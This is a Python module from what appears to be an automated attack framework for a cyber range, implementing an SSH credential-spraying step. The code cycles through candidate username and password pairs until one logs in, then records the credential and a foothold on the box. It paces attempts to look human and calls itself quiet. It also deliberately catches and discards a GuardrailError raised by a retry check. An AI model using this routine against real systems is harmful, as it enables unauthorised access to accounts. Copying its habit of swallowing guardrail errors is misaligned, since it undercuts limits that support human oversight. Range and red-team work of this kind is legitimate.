"""spray_access — try the credentials intel already knows, over SSH, until one lands."""

import time

from ..errors import GuardrailError, PolicyError, TransportError
from .base import Effect, Result, register

# Bound for the guesses; the per-box ground truth is never capped away first.
DEFAULT_CAP = 40
DEFAULT_PROBE_TIMEOUT = 20
# Pace attempts like a human, not a hammer.
DEFAULT_DELAY_SEC = 0.4
UNREACHABLE_AFTER = 2

PROBE_LINUX = "id -un"
PROBE_WINDOWS = "whoami"


def probe_command(windows):
    return PROBE_WINDOWS if windows else PROBE_LINUX


def is_windows_box(ctx, ip):
    box = ctx.intel.box_by_ip(ip)
    if box is not None:
        return bool(box.get("windows"))
    return ctx.is_windows(ip)


def candidate_pairs(ctx, ip):
    """Per-box facts first, then the pool; empty passwords are a real range state."""
    pairs = []
    for pair in (ctx.intel.candidate_pairs(ip) or []):
        try:
            user, password = pair
        except (TypeError, ValueError):
            continue                      # a malformed intel row is not a candidate
        if user:
            pairs.append((str(user), "" if password is None else str(password)))
    for user in (ctx.intel.candidate_users() or []):
        for password in (ctx.intel.candidate_passwords() or []):
            if user:
                pairs.append((str(user), "" if password is None else str(password)))
    return list(dict.fromkeys(pairs))


def auth_rejected(exc):
    """The transport flattens paramiko's exception types into TransportError, so the
    message is the only signal."""
    return "auth" in str(exc).lower()


def within_retry_cap(ctx, ip, user):
    """`ensure_retries` raises GuardrailError by contract but is a counter, not a
    safety gate: swallow it so a dead-end login is skipped, not a run-halt."""
    try:
        ctx.gate.ensure_retries(ctx.world, ip, user)
    except GuardrailError:
        return False
    return True


def probe_login(ctx, ip, user, password, windows, *, key_path=None, timeout=None):
    cmd = probe_command(windows)
    try:
        rc, out, err = ctx.ssh.ssh(ip, user, password, cmd,
                                   timeout=timeout or DEFAULT_PROBE_TIMEOUT,
                                   windows=windows, key_path=key_path)
    except TransportError as exc:
        why = str(exc)
        return ("rejected" if auth_rejected(exc) else "transport", "", why)
    if rc == 0 and (out or "").strip():
        return "ok", (out or "").strip().splitlines()[-1].strip(), ""
    return "rejected", "", ((err or out or "").strip()[:160] or f"rc={rc}")


def sweep(ctx, ip, candidates, windows, *, cap, timeout=None, delay=0.0):
    out = {"found": None, "attempts": 0, "skipped": 0, "transport": 0,
           "capped": False, "unreachable": False, "last_error": None, "cap": cap}
    for user, password, key_path in candidates:
        if out["attempts"] >= cap:
            out["capped"] = True
            break
        if not within_retry_cap(ctx, ip, user):
            out["skipped"] += 1
            continue
        if delay and out["attempts"]:
            time.sleep(delay)
        out["attempts"] += 1
        status, who, why = probe_login(ctx, ip, user, password, windows,
                                       key_path=key_path, timeout=timeout)
        if status == "ok":
            out["found"] = {"user": user, "password": password, "who": who,
                            "key_path": key_path}
            break
        ctx.world.count_cred_try(ip, user)
        out["last_error"] = why
        if status == "transport":
            out["transport"] += 1
            if out["transport"] >= UNREACHABLE_AFTER:
                out["unreachable"] = True
                break
    return out


def sweep_summary(label, ip, outcome):
    why = f"{label} on {ip}"
    if outcome.get("attempts"):
        why += f" after {outcome['attempts']} attempt(s)"
    if outcome.get("capped"):
        why += f" — attempt cap ({outcome['cap']}) hit with no working credential"
    if outcome.get("skipped"):
        why += (f"; {outcome['skipped']} login(s) skipped at the retry cap "
                "(a dead end, not a crash)")
    if outcome.get("unreachable"):
        why += " — the box stopped answering SSH (nothing to decide for the rest)"
    if outcome.get("last_error"):
        why += f" — last error: {outcome['last_error']}"
    return why


def limits_of(ctx):
    limits = ctx.cfg.get("limits") or {}
    return (int(limits.get("cred_spray_max", DEFAULT_CAP) or DEFAULT_CAP),
            int(limits.get("spray_probe_timeout", DEFAULT_PROBE_TIMEOUT)
                or DEFAULT_PROBE_TIMEOUT),
            float(limits.get("spray_delay_sec", DEFAULT_DELAY_SEC) or 0))


@register
class SprayAccess(Effect):
    id = "spray_access"
    name = "credential spray (SSH)"
    description = ("Try intel's candidate credentials over SSH on one box until one "
                   "authenticates; a success becomes a foothold. Use it on a box we "
                   "have no access to, with the pairs intel already knows (the box "
                   "password, credlist accounts, planted-vuln credentials) before "
                   "falling back to generic guesses. Bounded by cred_spray_max and "
                   "the per-login retry cap, and quiet: nothing is planted on the box.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
    }
    tags = frozenset({"access"})
    needs = {"foothold": False, "root": False, "c2": False, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        if not candidate_pairs(ctx, ip):
            raise PolicyError(f"spray_access has no candidate credential for {ip} — "
                              "intel knows no account on this box")
        if ctx.world.failure_count(self.id, ip) >= 2:
            raise PolicyError(f"spray_access already failed twice on {ip} — the known "
                              "pairs are burned; work another target")

    def run(self, ctx, params):
        ip = params["ip"]
        windows = is_windows_box(ctx, ip)
        pairs = candidate_pairs(ctx, ip)
        cap, timeout, delay = limits_of(ctx)
        source = f"{self.id}:{getattr(ctx.intel, 'source_name', 'intel')}"

        outcome = sweep(ctx, ip,
                        [(user, password, None) for user, password in pairs],
                        windows, cap=cap, timeout=timeout, delay=delay)
        found = outcome["found"]
        # ok=True only when a credential answered on the wire; a cap hit is ok=False.
        if found is None:
            return Result(False, sweep_summary(f"no working credential in "
                                               f"{len(pairs)} candidate(s)", ip, outcome),
                          data={"attempts": outcome["attempts"],
                                "candidates": len(pairs)})

        user, password, who = found["user"], found["password"], found["who"]
        # Nothing changed on the box, so no artifact and no restore recipe.
        ctx.world.add_cred(user, password, source, ip)
        ctx.world.add_foothold(ip, user, password, "user", windows=windows)
        ctx.world.note(ip, f"access: credential spray landed {user} "
                           f"({source}) after {outcome['attempts']} attempt(s)")
        return Result(True,
                      f"credential spray landed {user} on {ip} ({source}, "
                      f"{outcome['attempts']} attempt(s), box calls it {who or user})",
                      data={"user": user, "password": password, "who": who,
                            "attempts": outcome["attempts"], "source": source})
